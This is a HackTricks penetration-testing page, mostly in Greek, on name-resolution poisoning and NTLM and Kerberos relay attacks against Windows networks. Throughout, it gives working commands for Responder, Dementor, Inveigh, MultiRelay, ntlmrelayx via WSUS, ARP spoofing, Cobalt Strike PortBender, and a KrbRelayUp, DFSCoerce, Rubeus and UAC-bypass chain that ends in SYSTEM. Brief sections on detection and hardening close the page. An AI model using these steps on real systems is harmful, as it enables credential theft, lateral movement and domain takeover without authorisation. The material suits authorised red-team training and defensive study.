# Spoofing LLMNR, NBT-NS, mDNS/DNS και WPAD και Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Πρωτόκολλα Δικτύου

### Πρωτόκολλα Τοπικής Επίλυσης Ονομάτων

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft και άλλα λειτουργικά χρησιμοποιούν LLMNR και NBT-NS για τοπική επίλυση ονομάτων όταν το DNS αποτυγχάνει. Παρομοίως, τα συστήματα Apple και Linux χρησιμοποιούν mDNS.
- Αυτά τα πρωτόκολλα είναι ευάλωτα σε υποκλοπή και spoofing λόγω της μη-επαληθευμένης, broadcast φύσης τους πάνω από UDP.
- [Responder](https://github.com/lgandx/Responder) και [Dementor](https://github.com/MatrixEditor/Dementor) μπορούν να χρησιμοποιηθούν για να προσποιηθούν υπηρεσίες στέλνοντας πλαστές απαντήσεις σε hosts που κάνουν ερωτήματα σε αυτά τα πρωτόκολλα.
- Περισσότερες πληροφορίες για την impersonation υπηρεσιών χρησιμοποιώντας Responder μπορούν να βρεθούν [εδώ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD επιτρέπει στους browsers να ανακαλύπτουν αυτόματα τις ρυθμίσεις proxy.
- Η ανίχνευση γίνεται μέσω DHCP, DNS, ή εναλλακτικά μέσω LLMNR και NBT-NS αν το DNS αποτύχει.
- Responder μπορεί να αυτοματοποιήσει επιθέσεις WPAD, κατευθύνοντας clients σε κακόβουλους WPAD servers.

### Responder/Dementor για Protocol Poisoning

- **Responder** είναι ένα εργαλείο που χρησιμοποιείται για poisoning ερωτημάτων LLMNR, NBT-NS και mDNS, απαντώντας επιλεκτικά με βάση τους τύπους ερωτημάτων, με κύριο στόχο τις SMB υπηρεσίες.
- Έρχεται προεγκατεστημένο στο Kali Linux και είναι διαμορφώσιμο στο `/etc/responder/Responder.conf`.
- Responder εμφανίζει τα καταγραμμένα hashes στην οθόνη και τα αποθηκεύει στον κατάλογο `/usr/share/responder/logs`.
- Υποστηρίζει τόσο IPv4 όσο και IPv6.
- Η Windows έκδοση του Responder είναι διαθέσιμη [εδώ](https://github.com/lgandx/Responder-Windows).

- **Dementor** επεκτείνει τα θέματα του multicast poisoning και επιπλέον λειτουργεί ως rogue service provider (συμπεριλαμβανομένης υποστήριξης CUPS RCE)
- Η συνολική δομή είναι παρόμοια με **Responder** με πιο λεπτομερή διαμόρφωση. (default is here: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Η συμβατότητα μεταξύ **Dementor** και **Responder** υπάρχει εδώ: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Εισαγωγή και Τεκμηρίωση εδώ: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Διορθώνει προβλήματα καταγραφής που εισήγαγε το Responder σε ορισμένα πρωτόκολλα

#### Εκτέλεση Responder

- Για να τρέξετε Responder με τις προεπιλεγμένες ρυθμίσεις: `responder -I <Interface>`
- Για πιο επιθετική ανίχνευση (με πιθανές παρενέργειες): `responder -I <Interface> -P -r -v`
- Τεχνικές για να καταγράψετε NTLMv1 challenges/responses για ευκολότερο cracking: `responder -I <Interface> --lm --disable-ess`
- Η impersonation του WPAD μπορεί να ενεργοποιηθεί με: `responder -I <Interface> --wpad`
- Αιτήματα NetBIOS μπορούν να επιλυθούν στη διεύθυνση IP του attacker, και μπορεί να στηθεί ένας authentication proxy: `responder.py -I <interface> -Pv`

#### Εκτέλεση Dementor

- Με τις προεπιλεγμένες ρυθμίσεις: `Dementor -I <interface>`
- Με προεπιλεγμένες ρυθμίσεις σε analysis mode: `Dementor -I <interface> -A`
- Αυτόματη υποβάθμιση NTLM session (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Τρέξτε την τρέχουσα συνεδρία με custom config: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Spoofing DHCP responses μπορεί να μολύνει μόνιμα τις πληροφορίες δρομολόγησης ενός θύματος, προσφέροντας μια πιο διακριτική εναλλακτική στην ARP poisoning.
- Απαιτεί ακριβή γνώση της διαμόρφωσης του στοχευόμενου δικτύου.
- Εκτέλεση της επίθεσης: `./Responder.py -I eth0 -Pdv`
- Αυτή η μέθοδος μπορεί να καταγράψει αποτελεσματικά NTLMv1/2 hashes, αλλά απαιτεί προσεκτική διαχείριση για να αποφευχθεί η όχληση του δικτύου.

### Συλλογή διαπιστευτηρίων με Responder/Dementor

- Responder/Dementor θα προσποιηθούν υπηρεσίες χρησιμοποιώντας τα παραπάνω πρωτόκολλα, καταγράφοντας διαπιστευτήρια (συνήθως NTLMv2 Challenge/Response) όταν ένας χρήστης προσπαθεί να αυθεντικοποιηθεί έναντι των spoofed υπηρεσιών.
- Μπορούν να γίνουν προσπάθειες για υποβάθμιση σε NetNTLMv1 ή απενεργοποίηση ESS για ευκολότερο cracking των διαπιστευτηρίων.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Είναι κρίσιμο να σημειωθεί ότι η χρήση αυτών των τεχνικών πρέπει να γίνεται νόμιμα και ηθικά, εξασφαλίζοντας κατάλληλη εξουσιοδότηση και αποφεύγοντας διαταραχές ή μη εξουσιοδοτημένη πρόσβαση.

## Inveigh

Το Inveigh είναι ένα εργαλείο για penetration testers και red teamers, σχεδιασμένο για Windows συστήματα. Παρέχει λειτουργίες παρόμοιες με το Responder, εκτελώντας spoofing και man-in-the-middle επιθέσεις. Το εργαλείο εξελίχθηκε από ένα PowerShell script σε ένα C# binary, με [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) και [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) ως τις κύριες εκδόσεις. Λεπτομερείς παράμετροι και οδηγίες μπορούν να βρεθούν στο [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Το Inveigh μπορεί να λειτουργήσει μέσω PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ή εκτελεσμένο ως δυαδικό αρχείο C#:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Αυτή η επίθεση αξιοποιεί τις συνεδρίες αυθεντικοποίησης SMB για πρόσβαση σε έναν στόχο, παρέχοντας shell συστήματος σε περίπτωση επιτυχίας. Τα βασικά προαπαιτούμενα περιλαμβάνουν:

- Ο χρήστης που αυθεντικοποιείται πρέπει να έχει Local Admin access στο relayed host.
- Το SMB signing πρέπει να είναι απενεργοποιημένο.

#### 445 Port Forwarding and Tunneling

Σε σενάρια όπου η άμεση εισαγωγή στο δίκτυο δεν είναι εφικτή, η κίνηση στην port 445 πρέπει να γίνει port forwarding και tunneling. Εργαλεία όπως [**PortBender**](https://github.com/praetorian-inc/PortBender) βοηθούν στην ανακατεύθυνση της κίνησης του port 445 σε άλλη θύρα, κάτι που είναι απαραίτητο όταν υπάρχει Local Admin access για driver loading.

Ρύθμιση και λειτουργία του PortBender στο Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Άλλα εργαλεία για NTLM Relay Attack

- **Metasploit**: Ρυθμίζεται με proxies και λεπτομέρειες τοπικού και απομακρυσμένου host.
- **smbrelayx**: Ένα Python script για το relaying των SMB sessions και την εκτέλεση εντολών ή την εγκατάσταση backdoors.
- **MultiRelay**: Ένα εργαλείο από τη σουίτα Responder για το relay συγκεκριμένων χρηστών ή όλων, την εκτέλεση εντολών ή την εξαγωγή hashes.

Κάθε εργαλείο μπορεί να ρυθμιστεί να λειτουργεί μέσω SOCKS proxy αν χρειαστεί, επιτρέποντας επιθέσεις ακόμα και με έμμεση πρόσβαση στο δίκτυο.

### Λειτουργία MultiRelay

Το MultiRelay εκτελείται από τον _**/usr/share/responder/tools**_ κατάλογο, στοχεύοντας συγκεκριμένες διευθύνσεις IP ή χρήστες.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Αυτά τα εργαλεία και οι τεχνικές αποτελούν ένα ολοκληρωμένο σύνολο για την εκτέλεση NTLM Relay επιθέσεων σε διάφορα δικτυακά περιβάλλοντα.

### Κατάχρηση του WSUS HTTP (8530) για NTLM Relay to LDAP/SMB/AD CS (ESC8)

WSUS clients authenticate to their update server using NTLM over HTTP (8530) or HTTPS (8531). Όταν το HTTP είναι ενεργοποιημένο, οι περιοδικές check-ins των clients μπορούν να εξαναγκαστούν ή να υποκλαπούν στο τοπικό segment και να αναμεταδοθούν με ntlmrelayx σε LDAP/LDAPS/SMB ή AD CS HTTP endpoints (ESC8) χωρίς να σπάσετε κανένα hash. Αυτό συγχωνεύεται με την κανονική κίνηση ενημερώσεων και συχνά αποδίδει machine-account authentications (HOST$).

What to look for
- GPO/registry configuration under HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate and ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- WSUS SOAP endpoints used by clients over HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Χωρίς αυθεντικοποίηση
- Σάρωση για listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Παρακολούθηση HTTP WSUS κίνησης μέσω L2 MITM και καταγραφή ενεργών clients/endpoints με wsusniff.py (μόνο HTTP εκτός αν μπορείτε να κάνετε τους clients να εμπιστευτούν το TLS cert σας).
- Με αυθεντικοποίηση
- Αναλύστε SYSVOL GPOs για WSUS keys με MANSPIDER + regpol (το wrapper wsuspider.sh συνοψίζει WUServer/WUStatusServer/UseWUServer).
- Query endpoints σε κλίμακα από hosts (NetExec) ή τοπικά:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) Τοποθετηθείτε για MITM (ίδιο L2) έτσι ώστε ένας client να επιλύει τον WSUS server σε εσάς (ARP/DNS poisoning, Bettercap, mitm6, κ.λπ.). Παράδειγμα με arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Ανακατεύθυνση θύρας 8530 στον relay listener σας (προαιρετικό, βολικό):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Ξεκινήστε το ntlmrelayx με τον HTTP listener (απαιτεί υποστήριξη HTTP listener από Impacket; δείτε τα PRs παρακάτω):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Other common targets:
- Relay to SMB (if signing off) for exec/dump: -t smb://<host>
- Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>
- Relay to AD CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Προκαλέστε ένα client check-in ή περιμένετε το προγραμματισμένο. Από έναν client:
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) Χρησιμοποιήστε τις αυθεντικοποιημένες συνεδρίες SOCKS (αν -socks) ή τα απευθείας αποτελέσματα του relay για post-exploitation (LDAP αλλαγές, SMB ενέργειες, ή έκδοση πιστοποιητικού AD CS για μεταγενέστερη αυθεντικοποίηση).

HTTPS constraint (8531)
- Η παθητική υποκλοπή του WSUS μέσω HTTPS είναι αναποτελεσματική εκτός αν οι clients εμπιστεύονται το πιστοποιητικό σας. Χωρίς ένα αξιόπιστο cert ή άλλη παραβίαση TLS, το NTLM handshake δεν μπορεί να συλλεχθεί ή να αναμεταδοθεί από WSUS HTTPS traffic.

Notes
- Το WSUS ανακοινώθηκε ως deprecated αλλά παραμένει ευρέως αναπτυγμένο· το HTTP (8530) εξακολουθεί να είναι κοινό σε πολλά περιβάλλοντα.
- Χρήσιμα βοηθήματα: wsusniff.py (παρατήρηση HTTP WSUS check-ins), wsuspider.sh (καταγραφή WUServer/WUStatusServer από GPOs), NetExec reg-query σε κλίμακα.
- Το Impacket επανέφερε την υποστήριξη HTTP listener για ntlmrelayx στο PR #2034 (πρωτοπροστέθηκε στο PR #913).

### Force NTLM Logins

Σε Windows ίσως να μπορείτε να αναγκάσετε κάποιους privileged accounts να αυθεντικοποιηθούν σε αυθαίρετες μηχανές. Διαβάστε την παρακάτω σελίδα για να μάθετε πώς:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

Μια **Kerberos relay attack** κλέβει ένα **AP-REQ ticket** από μια υπηρεσία και το ξαναχρησιμοποιεί εναντίον μιας δεύτερης υπηρεσίας που μοιράζεται το **same computer-account key** (επειδή και τα δύο SPNs κάθονται στον ίδιο `$` machine account). Αυτό λειτουργεί παρότι οι **service classes** των SPNs διαφέρουν (π.χ. `CIFS/` → `LDAP/`) επειδή το *key* που αποκρυπτογραφεί το ticket είναι το NT hash της μηχανής, όχι το SPN string καθαυτό και το SPN string δεν είναι μέρος της υπογραφής.

Σε αντίθεση με το NTLM relay, το hop περιορίζεται στον *ίδιο host* αλλά, αν στοχεύσετε ένα πρωτόκολλο που σας επιτρέπει να γράψετε σε LDAP, μπορείτε να αλυσιδώσετε σε **Resource-Based Constrained Delegation (RBCD)** ή **AD CS enrollment** και να αποκτήσετε **NT AUTHORITY\SYSTEM** σε ένα βήμα.

Για λεπτομερείς πληροφορίες σχετικά με αυτή την επίθεση δείτε:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Αποδεικνύει τον χρήστη στο KDC | δεν τροποποιείται |
| **Service ticket / TGS-REQ ↔ REP** | Δεσμευμένο σε ένα **SPN**· κρυπτογραφημένο με το κλειδί του ιδιοκτήτη του SPN | ανταλλάξιμο αν τα SPNs μοιράζονται λογαριασμό |
| **AP-REQ** | Ο client στέλνει `TGS` στην υπηρεσία | **αυτό που κλέβουμε και επαναπαίζουμε** |

* Τα tickets κρυπτογραφούνται με το **password-derived key του λογαριασμού που κατέχει το SPN**.
* Ο **Authenticator** μέσα στο AP-REQ έχει χρονική σφραγίδα 5 λεπτών· η αναπαραγωγή μέσα σε αυτό το παράθυρο είναι έγκυρη μέχρι η cache της υπηρεσίας να δει διπλότυπο.
* Τα Windows σπάνια ελέγχουν αν το SPN string στο ticket ταιριάζει με την υπηρεσία που στοχεύετε, οπότε ένα ticket για `CIFS/HOST` φυσιολογικά αποκρυπτογραφείται σωστά στο `LDAP/HOST`.

- 2. **Τι πρέπει να ισχύει για να γίνει Kerberos relay**

1. **Shared key:** source and target SPNs belong to the same computer account (default on Windows servers).
2. **No channel protection:** SMB/LDAP signing off and EPA off for HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc..
4. **Ticket source not already used:** you win the race before the real packet hits or block it entirely; otherwise the server’s replay cache fires Event 4649.
5. You need to somehow be able to perform a **MitM in the communication** maybe being part of the DNSAmins group to modify the DNS of the domain or being able to change the HOST file of the victim.

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Ξεκινήστε τον relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` συσκευάζει **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** σε ένα binary.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
Το DFSCoerce αναγκάζει τον DC να στείλει σε εμάς ένα Kerberos `CIFS/DC01` ticket.

- 3.4 **Relay the AP-REQ**

Το KrbRelay εξάγει το GSS blob από το SMB, το επανασυσκευάζει σε ένα LDAP bind και το προωθεί στο `ldap://DC01` — η πιστοποίηση είναι επιτυχής επειδή το **ίδιο κλειδί** το αποκρυπτογραφεί.

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Τώρα κατέχετε **NT AUTHORITY\SYSTEM**.


### **Περισσότερες διαδρομές που αξίζει να γνωρίζετε**

| Δίαυλος | Τρικ | Γιατί έχει σημασία |
|--------|-------|----------------|
| **AuthIP / IPSec** | Fake server sends a **GSS-ID payload** with any SPN; client builds an AP-REQ straight to you | Works even across subnets; machine creds by default |
| **DCOM / MSRPC** | Malicious OXID resolver forces client to auth to arbitrary SPN and port | Pure *local* priv-esc; sidesteps firewall |
| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` and get a cert, then **PKINIT** to mint TGTs | Bypasses LDAP signing defenses |
| **Shadow Credentials** | Write `msDS-KeyCredentialLink`, then PKINIT with forged key pair | No need to add a computer account |

### **Αντιμετώπιση προβλημάτων**

| Σφάλμα | Σημασία | Διόρθωση |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Το κλειδί του ticket ≠ κλειδί του target | Λάθος host/SPN |
| `KRB_AP_ERR_SKEW` | Το ρολόι έχει απόκλιση > 5 λεπτά | Συγχρονίστε την ώρα ή χρησιμοποιήστε `w32tm` |
| LDAP bind fails | Ενεργοποιημένη υπογραφή | Use AD CS path or disable signing |
| Event 4649 spam | Η υπηρεσία είδε διπλό Authenticator | block or race original packet |


### **Εντοπισμός**

* Αύξηση στα **Event 4769** για `CIFS/`, `HTTP/`, `LDAP/` από την ίδια πηγή μέσα σε δευτερόλεπτα.
* **Event 4649** στην υπηρεσία υποδεικνύει ανίχνευση replay.
* Kerberos logon από **127.0.0.1** (relay to local SCM) είναι πολύ ύποπτο—map via Sigma rule in KrbRelayUp docs.
* Παρακολουθήστε αλλαγές στις ιδιότητες `msDS-AllowedToActOnBehalfOfOtherIdentity` ή `msDS-KeyCredentialLink`.

## **Σκληροποίηση**

1. **Enforce LDAP & SMB signing + EPA** σε κάθε server.
2. **Split SPNs** ώστε το HTTP να μην είναι στον ίδιο λογαριασμό με CIFS/LDAP.
3. Patch coercion vectors (PetitPotam KB5005413, DFS, AuthIP).
4. Set **`ms-DS-MachineAccountQuota = 0`** για να σταματήσετε τις μη εξουσιοδοτημένες προσθήκες υπολογιστών.
5. Alert on **Event 4649** and unexpected loopback Kerberos logons.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
